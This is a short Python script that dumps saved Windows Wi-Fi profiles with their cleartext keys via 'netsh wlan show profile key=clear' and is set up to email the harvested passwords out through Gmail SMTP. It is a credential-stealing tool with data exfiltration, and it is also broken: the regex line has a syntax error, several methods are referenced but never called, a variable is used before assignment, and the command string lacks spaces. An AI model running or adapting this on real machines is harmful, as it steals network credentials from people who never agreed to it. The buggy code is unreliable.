import subprocess
import smtplib
import re

email = input("Enter your Email Address >> ")
password = input("Enter The Password For Your Email Address")

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit

command = "netsh wlan show profile key=clear" #enter the target router name before the key
networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:profile"\s*:\s)(.*))

for network_name in network_names_list:
	command = "netsh wlan show profile" + network_name + "key=clear"
	current_result = subprocess.check_output(command, shell=True)
	result = result + current_result

# send_mail("your gmail", "your password", result)

